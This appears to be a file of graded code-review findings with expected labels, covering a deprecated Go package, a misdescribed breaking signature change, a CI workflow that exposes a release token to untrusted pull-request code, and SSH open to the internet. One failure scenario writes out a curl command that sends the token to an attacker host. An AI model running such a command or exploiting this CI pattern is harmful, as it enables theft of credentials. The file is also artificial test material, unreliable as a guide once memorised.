findings.body: io/ioutil is deprecated since Go 1.16. ioutil.ReadFile is a thin wrapper around os.ReadFile; use os.ReadFile directly. This also avoids importing a deprecated package for a single call.
findings.failure_scenario: The deprecated package may be removed in future Go versions, and linters flag it; building with -Werror or future toolchains will fail.
findings.title: Use io/os instead of the deprecated io/ioutil

findings.anchor: func FetchUser(id string, timeout time.Duration) (User, time.Duration) {
findings.body: The commit message claims to 'preserve FetchUser caller compatibility', but the signature changed in two breaking ways: the parameter type went from `*time.Duration` to `time.Duration`, and the return type went from `User` to `(User, time.Duration)`. Every existing caller must be updated, which is the opposite of preserving compatibility.
findings.failure_scenario: A caller written against the old signature, e.g. `u := FetchUser(id, &t)`, fails to compile because it now receives two values and passes a pointer where a value is expected.
findings.title: FetchUser signature change breaks caller compatibility

findings.body: `ioutil.ReadFile("defaults.json")` is called but both its return values are thrown away with `_, _ =`. The file content is never used and any read error (missing file, permission denied) is silently swallowed, making this line dead code with no observable effect.
findings.failure_scenario: If defaults.json is missing or unreadable, the error is ignored and execution continues as if the file were read, masking a configuration problem.
findings.title: File read result and error are both discarded

findings.body: Switching from `pull_request` to `pull_request_target` changes the trust boundary. `pull_request_target` executes the workflow with the base branch's permissions and **full access to repository secrets**, while the added `ref: ${{ github.event.pull_request.head.sha }}` checkout and `npm test` step run arbitrary code from the untrusted PR. `npm test` executes scripts defined in the PR's `package.json` (e.g. `pretest`, `test`, `posttest`), so a malicious PR author can run any commands they like inside a job that has `RELEASE_TOKEN` in its environment. The token can then be exfiltrated via a network request embedded in the test script.
findings.failure_scenario: An attacker opens a PR whose package.json contains a test script like `curl https://evil.example.com/?t=$RELEASE_TOKEN`. Because the trigger is `pull_request_target`, the secret is injected; because the checkout is the PR head SHA, the malicious script runs; the token is sent to the attacker.
findings.title: Revert to `pull_request` or remove secret exposure before running untrusted PR code

findings.body: The `RELEASE_TOKEN` secret is injected into the environment of `npm test`, which runs against the checked-out PR head commit. Combined with the `pull_request_target` trigger, this gives untrusted PR code direct access to a release token. Even if the token is intended for a later publish step, exposing it to arbitrary test execution on attacker-controlled code allows theft.
findings.failure_scenario: A malicious PR's test code reads `process.env.RELEASE_TOKEN` and transmits it to an attacker-controlled endpoint, compromising the release credential.
findings.title: Do not expose RELEASE_TOKEN to untrusted PR test execution

expected.label: pull_request_target executes untrusted head with a secret

findings.body: The admin security group rule for SSH (port 22) is changed from a restricted internal CIDR (10.20.0.0/16) to 0.0.0.0/0, exposing the admin ingress rule to the entire internet. This is a significant security weakness: any source can attempt to connect to port 22 on resources using this security group. If this exposure is intentional (e.g., for a temporary bastion or a public-facing service), it must be documented and supported by tests verifying the configuration is deliberate and constrained. The diff provides no such artefacts.
findings.failure_scenario: An attacker scans for hosts with port 22 open to the internet, finds the resource using this security group, and attempts brute-force or exploits against the SSH service, gaining unauthorized access if the service is vulnerable or misconfigured.
findings.title: Restrict SSH ingress from 0.0.0.0/0 to a narrower CIDR or document the exposure

expected.label: SSH ingress is open to the internet
